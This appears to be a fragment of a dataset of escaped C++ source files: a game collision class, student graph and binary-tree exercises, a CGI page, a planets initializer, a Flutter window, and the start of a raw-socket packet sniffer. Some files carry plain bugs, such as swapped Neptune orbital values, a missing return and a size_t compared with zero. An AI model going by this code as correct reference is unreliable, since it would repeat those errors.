{1, 1}, {1, 2}, {1, 3},\n\t{2, 0}, {2, 1}, {2, 2}, {2, 3}, {3, 0}, ",
    "// N3TransformCollision.cpp: implementation of the CN3TransformCollision class.\n//\n//////////////////////////////////////////////////////////////////////\n#include \"stdafx.h\"\n#include \"N3TransformCollision.h\"\n#include \"N3VMesh.h\"\n\nCN3TransformCollision::CN3TransformCollision()\n{\n\tm_dwType |= OBJ_TRANSFORM_COLLISION;\n\n\tm_fRadius = 0;\n\tm_vMin.Set(0,0,0);\n\tm_vMax.Set(0,0,0);\n\n\tm_pMeshCollision = NULL;\n\tm_pMeshClimb = NULL;\n}\n\nCN3TransformCollision::~CN3TransformCollision()\n{\n\ts_MngVMesh.Delete(&m_pMeshCollision);\n\ts_MngVMesh.Delete(&m_pMeshClimb);\n}\n\nvoid CN3TransformCollision::Release()\n{\n\tm_fRadius = 0;\n\tm_vMin.Set(0,0,0);\n\tm_vMax.Set(0,0,0);\n\n\ts_MngVMesh.Delete(&m_pMeshCollision);\n\ts_MngVMesh.Delete(&m_pMeshClimb);\n\n\tCN3Transform::Release();\n}\n\nbool CN3TransformCollision::Load(HANDLE hFile)\n{\n\tCN3Transform::Load(hFile);\n\n\tint nL = 0;\n\tchar szFN[512] = \"\";\n\n\tDWORD dwRWC;\n\tReadFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0)\n\t{\n\t\tReadFile(hFile, szFN, nL, &dwRWC, NULL); szFN[nL] = NULL; // \uba54\uc2dc \ud30c\uc77c \uc774\ub984..\n\t\tm_pMeshCollision = s_MngVMesh.Get(szFN);\n\t}\n\n\tReadFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0)\n\t{\n\t\tReadFile(hFile, szFN, nL, &dwRWC, NULL); szFN[nL] = NULL; // \uba54\uc2dc \ud30c\uc77c \uc774\ub984..\n\t\tm_pMeshClimb = s_MngVMesh.Get(szFN);\n\t}\n\treturn true;\n}\n\n#ifdef _N3TOOL\nbool CN3TransformCollision::Save(HANDLE hFile)\n{\n\tCN3Transform::Save(hFile);\n\n\tDWORD dwRWC;\n\n\tint nL = 0;\n\tif(m_pMeshCollision) nL = m_pMeshCollision->FileName().size();\n\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0) \n\t{\n\t\tif(m_pMeshCollision->FileName().find(\"object\\\\\") < 0) // \uc784\uc2dc\ub85c \uacbd\ub85c\ub97c \ubc14\uafb8\ub824\uace0 \ub123\uc5c8\ub2e4.. \ub098\uc911\uc5d0 \ud544\uc694\uc5c6\uc74c \uc9c0\uc6b4\ub2e4..\n\t\t{\n\t\t\tchar szFNTmp[256];\n\t\t\twsprintf(szFNTmp, \"Object\\\\%s.N3VMesh\", m_pMeshCollision->m_szName.c_str());\n\t\t\tm_pMeshCollision->FileNameSet(szFNTmp);\n\n\t\t\tSetFilePointer(hFile, -4, 0, FILE_CURRENT);\n\t\t\tnL = m_pMeshCollision->FileName().size();\n\t\t\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\t\t}\n\n\t\tWriteFile(hFile, m_pMeshCollision->FileName().c_str(), nL, &dwRWC, NULL);\n\t}\n\n\tnL = 0;\n\tif(m_pMeshClimb) nL = m_pMeshClimb->FileName().size();\n\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\tif(nL > 0) \n\t{\n\t\tif(-1 == m_pMeshClimb->FileName().find(\"object\\\\\")) // \uc784\uc2dc\ub85c \uacbd\ub85c\ub97c \ubc14\uafb8\ub824\uace0 \ub123\uc5c8\ub2e4.. \ub098\uc911\uc5d0 \ud544\uc694\uc5c6\uc74c \uc9c0\uc6b4\ub2e4..\n\t\t{\n\t\t\tchar szFNTmp[256];\n\t\t\twsprintf(szFNTmp, \"Object\\\\%s.N3VMesh\", m_pMeshClimb->m_szName.c_str());\n\t\t\tm_pMeshClimb->FileNameSet(szFNTmp);\n\n\t\t\tSetFilePointer(hFile, -4, 0, FILE_CURRENT);\n\t\t\tnL = m_pMeshClimb->FileName().size();\n\t\t\tWriteFile(hFile, &nL, 4, &dwRWC, NULL); // Mesh FileName\n\t\t}\n\n\t\tWriteFile(hFile, m_pMeshClimb->FileName().c_str(), nL, &dwRWC, NULL);\n\t}\n\treturn true;\n}\n#endif // end of _N3TOOL\n\nvoid CN3TransformCollision::CollisionMeshSet(const std::string& szFN)\n{\n\ts_MngVMesh.Delete(&m_pMeshCollision);\n\tm_pMeshCollision = s_MngVMesh.Get(szFN);\n\tif(m_pMeshCollision) this->FindMinMax();\n}\n\nvoid CN3TransformCollision::ClimbMeshSet(const std::string& szFN)\n{\n\ts_MngVMesh.Delete(&m_pMeshClimb);\n\tm_pMeshClimb = s_MngVMesh.Get(szFN);\n\tif(m_pMeshClimb) m_pMeshClimb->FindMinMax();\n}\n\nint CN3TransformCollision::CheckCollisionPrecisely(bool bIgnoreBoxCheck, int ixScreen, int iyScreen, __Vector3* pVCol, __Vector3* pVNormal)\n{\n\t__Vector3 vPos, vDir; // 2D \uc88c\ud45c\ub97c 3D \uc88c\ud45c\ub85c \ubc14\uafb8\uace0..\n\t::_Convert2D_To_3DCoordinate(ixScreen, iyScreen, s_CameraData.mtxView, s_CameraData.mtxProjection, s_CameraData.vp, vPos, vDir);\n\n\tif(false == m_pMeshCollision->Pick(m_Matrix, vPos, vDir, pVCol, pVNormal)) return -1;\n\telse return 0;\n}\n\nvoid CN3TransformCollision::RenderCollisionMesh()\n{\n\tif(NULL == m_pMeshCollision) return;\n\ts_lpD3DDev->SetTransform(D3DTS_WORLD, &m_Matrix);\n\n\tm_pMeshCollision->Render(0xffff0000); // \ube68\uac04\uc0c9.\n}\n\nvoid CN3TransformCollision::RenderClimbMesh()\n{\n\tif(NULL == m_pMeshClimb) return;\n\ts_lpD3DDev->SetTransform(D3DTS_WORLD, &m_Matrix);\n\n\tm_pMeshClimb->Render(0xff0000ff); // \ud30c\ub780\uc0c9..\n}\n\n/*\n#ifdef _N3TOOL\nBOOL CN3TransformCollision::CheckClimb(__Vector3 &vPos, __Vector3 &vDir, __Vector3* pVCol, __Vector3* pVNormal, __Vector3* pVPolygon)\n{\n\tif(NULL == m_pMeshClimb) return FALSE;\n\t\n\tint nIC = m_pMeshClimb->IndexCount();\n\tint nFC = 0;\n\tif(nIC > 0)\n\t{\n\t\tnFC = nIC / 3; // Face Count\n\t}\n\telse\n\t{\n\t\tnFC = m_pMeshClimb->VertexCount() / 3;\n\t}\n\tif(nFC <= 0) return FALSE;\n\n\tfloat t,u,v;\n\t__Vector3 vSrc[3];\n\n\tif(nIC > 0)\n\t{\n\t\tWORD* pwIndices = m_pMeshClimb->Indices();\n\t\t__Vector3* pVSrc = m_pMeshClimb->Vertices();\n\t\tfor(int i = 0; i < nFC; i++)\n\t\t{\n\t\t\tvSrc[0] = pVSrc[pwIndices[i*3+0]] * m_Matrix;\n\t\t\tvSrc[1] = pVSrc[pwIndices[i*3+1]] * m_Matrix;\n\t\t\tvSrc[2] = pVSrc[pwIndices[i*3+2]] * m_Matrix;\n\n\t\t\tif(TRUE == ::IntersectTriangle(vPos, vDir, vSrc[0], vSrc[1], vSrc[2], t, u, v)) \n\t\t\t{\n\t\t\t\tif(pVCol) *pVCol = (vDir * t) + vPos;\n\t\t\t\tif(pVNormal) { pVNormal->Cross(vSrc[1] - vSrc[0], vSrc[2] - vSrc[0]); pVNormal->Normalize(); }\n\t\t\t\tif(pVPolygon)\n\t\t\t\t{\n\t\t\t\t\tpVPolygon[0] = vSrc[0];\n\t\t\t\t\tpVPolygon[1] = vSrc[1];\n\t\t\t\t\tpVPolygon[2] = vSrc[2];\n\t\t\t\t}\n\t\t\t\treturn TRUE;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\t__Vector3* pVSrc = m_pMeshClimb->Vertices();\n\t\tfor(int i = ",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n#include <errno.h>\r\n#include <utility>\r\n#include <algorithm>\r\n#include <iomanip>\r\n#include <ctime>\r\n\r\n\r\n#include <sstream>\r\n#include <cstdlib>\r\n#include <cstring>\r\n\r\n#include <cgicc/CgiDefs.h>\r\n#include <cgicc/Cgicc.h>\r\n#include <cgicc/FormEntry.h>\r\n#include <cgicc/HTTPHTMLHeader.h>\r\n#include <cgicc/HTMLClasses.h>\r\n\r\n#include \"Object.h\"\r\n#include \"functions.h\"\r\n#include \"get_validate_inputs.h\"\r\n\r\nusing namespace std;\r\nusing namespace cgicc;\r\n\r\nint main() {\r\n\r\n    Cgicc cgi;\r\n    cout << \"Content-type:text/html\\r\\n\\r\\n\";\r\n    cout << \"<html>\\n\";\r\n    cout << \"<head>\\n\";\r\n    cout << \"<title>CPS 3525 Project 3</title>\\n\";\r\n\r\n    //Script shows file upload section when button is clicked\r\n    cout << \"<script>\";\r\n    cout << \"function myFunction() {\";\r\n    cout << \"var x = document.getElementById('myDIV');\";\r\n    cout << \"if (x.style.display === 'none') {x.style.display = 'block';} else {x.style.display = 'none';\";\r\n    cout << \"}\";\r\n    cout << \"}\";\r\n    cout << \"</script>\";\r\n    \r\n    cout << \"<style>\";\r\n    cout << \"#myDIV {display: none;}\";\r\n    cout << \"body {font-family: Arial, sans-serif;margin: 0;padding: 0;background-color: #302222;}\" << endl;\r\n    cout << \".container {text-align: center;max-width: 800px;margin: 0 auto;margin-top: 20px;padding: 20px;background-color: #fff;border-radius: 8px;box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);}\" << endl;\r\n    cout << \".center {margin-left: auto;margin-right: auto;text-align: center;}\";\r\n    cout << \".container h1 {text-align: center;}\";\r\n    cout << \"</style>\";\r\n\r\n    cout << \"</head>\\n\";\r\n    cout << \"<body>\\n\";\r\n    cout << \"<div class='container'>\";\r\n    cout << \"<center><img src='../CPS3525/gridgame.png' alt='gridgame'></center>\\n\";\r\n    cout << \"<br>\";\r\n    \r\n    string game = cgi(\"game\");\r\n    string option = cgi(\"option\");\r\n\r\n    processInputs(game, option, cgi);\r\n    \r\n    \r\n    cout << \"<hr>\";\r\n\r\n    cout << \"</div>\";\r\n    cout << \"</body>\\n\";\r\n    cout << \"</html>\\n\";\r\n    return 0;\r\n}\r\n",
    "\ufeff#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nstruct Node {\n\tint dinhke;\n\tint trongso;\n\tNode* link;\n};\n\nconst int MAX = 20;\n\nstruct DanhSachKe {\n\tNode* dsk[MAX];\n\tint sodinh;\n};\n\nbool docDanhSachKe(const char* textFile, DanhSachKe& ds) {\n\tFILE* f = fopen(textFile, \"rt\");\n\tif (f == NULL) return false;\n\t//Khoi tao ds ke\n\tfor (int i = 0; i < MAX; i++)\n\t\tds.dsk[i] = NULL;\n\n\t//Doc so dinh cua danh sach ke\n\tfscanf(f, \"%d\", &ds.sodinh);\n\n\t//Doc danh sach ke\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tint sodinhke;\n\t\tfscanf(f, \"%d\", &sodinhke);\n\n\t\tfor (int j = 0; j < sodinhke; j++) {\n\t\t\t//Tao 1 con tro chua dinh ke doc tu file\n\t\t\tNode* p = new Node;\n\t\t\tfscanf(f, \"%d%d\", &p->dinhke, &p->trongso);\n\t\t\tp->link = NULL;\n\n\t\t\tif (ds.dsk[i] == NULL)\n\t\t\t\tds.dsk[i] = p;\n\t\t\telse {\n\t\t\t\tNode* temp = ds.dsk[i];\n\t\t\t\twhile (temp->link != NULL)\n\t\t\t\t\ttemp = temp->link;\n\t\t\t\ttemp->link = p;\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid xuatDanhSachKe(const char* textFile, DanhSachKe ds) {\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tcout << \"(\" << i << \"): \";\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tcout << \"(\" << p->dinhke << \",\" << p->trongso << \") \";\n\t\t\tp = p->link;\n\t\t}\n\t\tcout << endl;\n\t}\n}\n\nint tinhBacRa(DanhSachKe ds, int u) {\n\tint count = 0;\n\tNode* p = ds.dsk[u];\n\twhile (p != NULL) {\n\t\tcount++;\n\t\tp = p->link;\n\t}\n\treturn count;\n}\n\nint tinhBacVao(DanhSachKe ds, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tif (p->dinhke == u) {\n\t\t\t\tcount++;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tp = p->link;\n\t\t}\n\t}\n\treturn count;\n}\n\n//v l\u00e0 \u0111\u1ec9nh, u l\u00e0 \u0111\u1ec9nh k\u1ec1\nvoid trongSoLonNhat(DanhSachKe ds, int& v, int& u) {\n\tNode* max = NULL;\n\tfor (int i = 0; i < ds.sodinh; i++) {\n\t\tNode* p = ds.dsk[i];\n\t\twhile (p != NULL) {\n\t\t\tif (max == NULL)\n\t\t\t\tmax = p;\n\t\t\telse if (p->trongso > max->trongso) {\n\t\t\t\tmax = p;\n\t\t\t\tv = i;\n\t\t\t}\n\t\t\tp = p->link;\n\t\t}\n\t}\n\tif(max!=NULL)\n\t\tu = max->dinhke;\n}\n\nint main() {\n\tDanhSachKe danhSach;\n\tif (docDanhSachKe(\"TextDanhSachKe.txt\", danhSach)) {\n\t\tcout << \"Danh Sach Ke:\" << endl;\n\t\txuatDanhSachKe(\"TextDanhSachKe.txt\", danhSach);\n\t\tcout << endl;\n\t}\n\telse {\n\t\tcout << \"Failed to open file!\" << endl;\n\t}\n\n\tint ra, vao;\n\tcout << \"Nhap dinh muon tinh so bac ra: \"; cin >> ra;\n\tcout << \"Bac ra cua dinh \" << ra << \": \" << tinhBacRa(danhSach, ra);\n\tcout << \"\\nNhap dinh muon tinh so bac vao: \"; cin >> vao;\n\tcout << \"Bac vao cua dinh \" << vao << \": \" << tinhBacVao(danhSach, vao);\n\n\tint v, u;\n\ttrongSoLonNhat(danhSach, v, u);\n\tcout << \"\\nDinh co trong so lon nhat: (\" << v << \",\" << u << \")\" << \" voi trong so la 10. \";//Ghi chu de khong nham lan\n\tcout << endl << endl;\n\treturn 0;\n}",
    "#include <iostream>\n#include <string>\n#include <sstream>\n#include <functional>\n#include \"BinaryTree.h\"\n\nusing namespace std;\n\n/**\n * helper for printout\n*/\nstatic void printOutput(vector<vector<int>>& allLayers) {\n    cout<<\"Depth: \"<< allLayers.size() << endl;\n    cout<<\"[\";\n    for (auto layer : allLayers) {\n        cout<<\"[\";\n        for (int idex = 0; idex < layer.size(); idex++) {\n            cout<< layer.at(idex);\n            if (idex != (layer.size() -1)) cout << \",\";\n        }\n        cout<<\"]\";\n    }\n    cout<<\"]\\n\";\n}\n\n/**\n * compare vector\n*/\nstatic bool compareVector(vector<vector<int>>& vector1, vector<vector<int>>& vector2) {\n    if (vector1.size() != vector2.size()) return false;\n    for (int layer = 0; layer < vector1.size(); layer++) {\n        for (int nodeIdx = 0; nodeIdx < vector1.at(layer).size(); nodeIdx++) {\n            if (vector1.at(layer).at(nodeIdx) != vector2.at(layer).at(nodeIdx)) return false;\n        }\n    }\n    return true;\n}\n\nstatic void test() {\n  /**\n   * test case 1\n  */\n  {\n      cout<<\"===============TEST 1 START=================\"<<endl;\n      cout<<\"Tree:root = [5,4,8,11,null,13,4,7,2,null,null,5,1]\\n\";\n      cout<<\"Target: 22\\n\";\n      vector<vector<int>> expected = {{5,4,11,2},{5,8,4,5}};\n      cout<<\"Expected: \";\n      printOutput(expected);\n      cout<<endl;\n      TreeNode *root = new TreeNode(5);\n      TreeNode *l10 = new TreeNode(4);\n      TreeNode *l11 = new TreeNode(8);\n      TreeNode *l20 = new TreeNode(11);\n      TreeNode *l22 = new TreeNode(13);\n      TreeNode *l23 = new TreeNode(4);\n      TreeNode *l30 = new TreeNode(7);\n      TreeNode *l31 = new TreeNode(2);\n      TreeNode *l36 = new TreeNode(5);\n      TreeNode *l37 = new TreeNode(1);\n      root->left = l10;\n      root->right = l11;\n      l10->left = l20;\n      l20->left = l30;\n      l20->right = l31;\n\n      l11->left = l22;\n      l11->right = l23;\n      l23->left = l36;\n      l23->right = l37;\n\n      // confirm solution\n      Solution solution;\n      auto result = solution.pathSum(root, 22);\n      printOutput(result);\n      cout<< (compareVector(result,expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l10;\n      delete l11;\n      delete l20;\n      delete l22;\n      delete l23;\n      delete l30;\n      delete l36;\n      delete l37;\n  }\n\n/**\n   * test case 2\n  */\n  {\n      cout<<\"===============TEST 2 START=================\"<<endl;\n      cout<<\"Tree:root = [1,2,3]\\n\";\n      cout<<\"Target: 5\\n\";\n      vector<vector<int>> expected = {};\n      cout<<\"Expected: \";\n      printOutput(expected);\n      cout<<endl;\n      TreeNode *root = new TreeNode(1);\n      TreeNode *l10 = new TreeNode(2);\n      TreeNode *l11 = new TreeNode(3);\n      root->left = l10;\n      root->right = l11;\n      // confirm solution\n      Solution solution;\n      auto result = solution.pathSum(root,0);\n      printOutput(result);\n      cout<< (compareVector(result,expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l10;\n      delete l11;\n  }\n\n  /**\n   * test case 3\n  */\n  {\n      cout<<\"===============TEST 3 START=================\"<<endl;\n      cout<<\"Tree:root = [1,2]\\n\";\n      cout<<\"Target: 0\\n\";\n      vector<vector<int>> expected = {};\n      cout<<\"Expected: \";\n      printOutput(expected);\n      cout<<endl;\n      TreeNode *root = new TreeNode(1);\n      TreeNode * l10 = new TreeNode(2);\n      root->left = l10;\n      // confirm solution\n      Solution solution;\n      auto result = solution.pathSum(root, 0);\n      printOutput(result);\n      cout<< (compareVector(result,expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l10;\n  }\n\n\n  /**\n   * test case 3\n  */\n  {\n      cout<<\"===============TEST 3 START=================\"<<endl;\n      cout<<\"Tree:root = [-2, null, -3]\\n\";\n      cout<<\"Target: -5\\n\";\n      vector<vector<int>> expected = {{-2,-3}};\n      cout<<\"Expected: \";\n      printOutput(expected);\n      cout<<endl;\n      TreeNode *root = new TreeNode(-2);\n      TreeNode * l11 = new TreeNode(-3);\n      root->right = l11;\n      // confirm solution\n      Solution solution;\n      auto result = solution.pathSum(root, -5);\n      printOutput(result);\n      cout<< (compareVector(result,expected)? \"PASS\": \"FAIL\") << endl;\n      delete root;\n      delete l11;\n  }\n}\n/**\n * main function\n*/\nint main(int argc, const char** argv) {\n  test();\n  return 0;\n}\n\n\n",
    "\n#include <stdlib.h>\n\n#include \"Planet.h\"\n#include \"Planets.h\"\n\nPlanets::Planets(int ClosestPlanet, int FarthestPlanet, int SystemCurrentDay, float SystemReloativeSize)\n{\n\tPlanet *OnePlanet;\n\n\n\tif (ClosestPlanet < 1)\n\t{\n\t\tClosestPlanet = 1;\n\t}\n\n\tif (FarthestPlanet > 8)\n\t{\n\t\tFarthestPlanet = 9;\n\t}\n\n\tif (ClosestPlanet > FarthestPlanet)\n\t{\n\t\tFarthestPlanet = ClosestPlanet;\n\t}\n\n\tClosestPlanetNumber = ClosestPlanet;\n\tFarthestPlanetNumber = FarthestPlanet;\n\tNumberOfPlanets = 1 + FarthestPlanetNumber - ClosestPlanetNumber;\n\tCurrentDay = SystemCurrentDay;\n\tReloativeSize = SystemReloativeSize;\n\n\n\tfor (int i = ClosestPlanetNumber; i <= FarthestPlanetNumber; i++)\n\t{\n\t\tswitch (i)\n\t\t{\n\t\tcase 1:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Mercury\", 0.47f, 87.97f, 10, 0.4f, CurrentDay, ReloativeSize, \"Mercury\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Venus\", 0.73f, 224.7f, 60, 0.9f, CurrentDay, ReloativeSize, \"Venus\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Mars\", 1.67f, 686.98f, 230, 1, CurrentDay, ReloativeSize, \"Mars\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Jupiter\", 5.37f, 11.86f * 365.26f, 40, 2, CurrentDay, ReloativeSize, \"Jupiter\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 6:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Saturn\", 10.07f, 29.46f * 365.26f, 300, 4, CurrentDay, ReloativeSize, \"Saturn\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 7:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Uranus\", 20.09f, 84.01f * 365.26f, 120, 1, CurrentDay, ReloativeSize, \"Uranus\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 8:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Neptune\", 164.79f * 365.26f, 30.32f, 180, 1, CurrentDay, ReloativeSize, \"Neptune\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\t\tcase 9:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Pluto\", 90650.0f, 48.823f, 250, 0.5, CurrentDay, ReloativeSize, \"Mercury\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tOnePlanet = new Planet();\n\t\t\tOnePlanet->Set(\"Earth\", 1.0f, 365.26f, 160, 1, CurrentDay, ReloativeSize, \"Earth\");\n\t\t\tListOfPlanets.push_back(*OnePlanet);\n\t\t}\n\t}\n}\n\nPlanets::~Planets()\n{\n}\n",
    "// NAME: GAL BEN AMI\n\n#include <climits>\n#include \"Algorithms.hpp\"\n#include \"Graph.hpp\"\n#include <queue>\n#include <limits>\n#include <vector>\n#include <set>\n#include <algorithm>\n\nusing namespace std;\nusing namespace ariel;\n\n// Enum to represent the color of a vertex in the graph\n// used in the cycle detection algorithm\nenum Color {WHITE, GRAY, BLACK};\n\n// Helper function to construct the path from the parent array\nstring constructPath(const vector<int>& parent, int start, int end)\n{\n    if (parent[(size_t)end] == -1)\n        return \"No path found\";\n\n    string path = to_string(end);\n    while (end != start)\n    {\n        end = parent[(size_t)end];\n        path = to_string(end) + \"->\" + path;\n    }\n    return path;\n}\n\n// Helper function to construct the cycle path\n// The cycle path is constructed from the cyclePath vector\nstring cycleConstructor(vector<int>& cyclePath, int startingVertex) {\n    string cycle;\n    size_t i = 0;\n    for ( i = 0 ; i < cyclePath.size() ; i++) {\n        if (cyclePath[i] == startingVertex) {\n            break;\n        }\n    }\n    for (size_t j = i; j < cyclePath.size(); j++) {\n        cycle = cycle + to_string(cyclePath[j]) + \"->\";\n    }\n    cycle = cycle + to_string(startingVertex);\n    return cycle;\n}\n\n\n\n// BFS function\nstring BFS(Graph &graph, int start, int end)\n{\n    vector<vector<int>> adjMatrix = graph.getAdjacencyMatrix();\n    size_t numVertices = graph.getNumVertices();\n    vector<int> parentVertx(numVertices, -1);\n    vector<bool> visited(numVertices, false);\n    string shortestpath = \"\";\n    queue<int> q;\n    // Mark the start vertex as visited\n    visited[(size_t)start] = true;\n    // Set the parentVertxious node of the start vertex as itself\n    // parentVertx[start] = start;\n    // Add the start vertex to the queue\n    q.push(start);\n\n    // While the queue is not empty\n    while (!q.empty())\n    {\n        // Get the front vertex of the queue\n        int current = q.front();\n        // Remove the front vertex from the queue\n        q.pop();\n\n        // If the current vertex is the end vertex, break the loop\n        if (current == end)\n            break;\n\n        // For each vertex in the graph\n        for (size_t i = 0; i < numVertices; ++i)\n        {\n            // If the current vertex is connected to the i-th vertex and the i-th vertex is not visited\n            if (adjMatrix[(size_t)current][i] != 0 && !visited[i])\n            {\n                // Add the i-th vertex to the queue\n                q.push(i);\n                // Mark the i-th vertex as visited\n                visited[i] = true;\n                // Set the parentVertxious node of the i-th vertex as the current vertex\n                parentVertx[i] = current;\n            }\n        }\n    }\n\n    return constructPath(parentVertx, start, end);\n}\n\n// Dijkstra function\nstring Dijkstra(Graph &graph, int start, int end)\n{\n    size_t numVertices = graph.getNumVertices();\n    vector<bool> visited(numVertices, false);\n    vector<int> d(numVertices, INT_MAX);\n    vector<int> parentVertx(numVertices, -1);\n\n    // Initialize the priority queue for Dijkstra's algorithm\n    priority_queue<pair<int, int>, vector<pair<int, int>>, greater<pair<int, int>>> pq;\n\n    // Initialize the distance of the start vertex as 0\n    d[(size_t)start] = 0;\n    // Add the start vertex to the priority queue\n    pq.push({0, start});\n\n    // While the priority queue is not empty\n    while (!pq.empty()){\n        // Get the vertex with the smallest distance\n        int u = pq.top().second;\n        // Remove the vertex from the priority queue\n        pq.pop();\n\n        // If the vertex has been visited, skip it\n        if (visited[(size_t)u])\n            continue;\n\n        // Mark the vertex as visited\n        visited[(size_t)u] = true;\n\n        // For each vertex in the graph\n        for (size_t v = 0; v < numVertices; ++v){\n            // If the u-th vertex is connected to the v-th vertex and the v-th vertex is not visited\n            if (graph.getAdjacencyMatrix()[(size_t)u][v] != 0 && !visited[v]){\n                // Calculate the new distance to the v-th vertex\n                int newdistance = d[(size_t)u] + graph.getAdjacencyMatrix()[(size_t)u][v];\n                // If the new distance is smaller than the current distanceance\n                if (newdistance < d[v]){\n                    // Update the distance to the v-th vertex\n                    d[v] = newdistance;\n                    // Set the parentVertxious node of the v-th vertex as the u-th vertex\n                    parentVertx[v] = u;\n                    // Add the v-th vertex to the priority queue\n                    pq.push({d[v], v});\n                }\n            }\n        }\n    }\n    // at this stage, parentVertx contains the shortest path from start to end\n    return constructPath(parentVertx, start, end);\n}\n\nstring bellmanford(Graph& graph, int start, int end){\n    size_t numVertices = graph.getNumVertices();\n    vector<int> d(numVertices, INT_MAX);\n    vector<int> parentV",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include \"sniffer.h\"\n#include <iostream>\n#include <iomanip>\n#include <chrono>\n#include <ctime>\n#include <sstream>\n\nvoid writePacketToFile(std::ofstream& outputFile, const std::vector<char>& packet, const char* src_ip, const char* dest_ip, const IPV4_HDR* ip_hdr) {\n    auto now = std::chrono::system_clock::now();\n    std::time_t now_c = std::chrono::system_clock::to_time_t(now);\n    struct tm local_time;\n    localtime_s(&local_time, &now_c);\n\n    // Write data to file\n    outputFile << std::put_time(&local_time, \"%T\") << \" \";\n    outputFile << src_ip << \" \";\n    outputFile << dest_ip << \" \";\n    outputFile << (int)ip_hdr->ip_ttl << \" \";\n    outputFile << (int)ip_hdr->ip_protocol << \" \";\n    outputFile << ip_hdr->ip_total_length << \" \";\n    outputFile.write(packet.data(), packet.size());\n    outputFile << std::endl;\n}\n\nbool receivePacket(SOCKET sock, char* buffer, int bufferSize, char* src_ip, char* dest_ip, IPV4_HDR*& ip_hdr, int& packetSize) {\n    memset(buffer, 0, bufferSize);\n    packetSize = recv(sock, buffer, bufferSize, 0);\n    if (packetSize == SOCKET_ERROR) {\n        std::cerr << \"Recv failed with error: \" << WSAGetLastError() << std::endl;\n        return false;\n    }\n\n    // Parse the packet\n    ip_hdr = (IPV4_HDR*)buffer;\n    if (inet_ntop(AF_INET, &(ip_hdr->ip_srcaddr), src_ip, INET_ADDRSTRLEN) == NULL ||\n        inet_ntop(AF_INET, &(ip_hdr->ip_destaddr), dest_ip, INET_ADDRSTRLEN) == NULL) {\n        std::cerr << 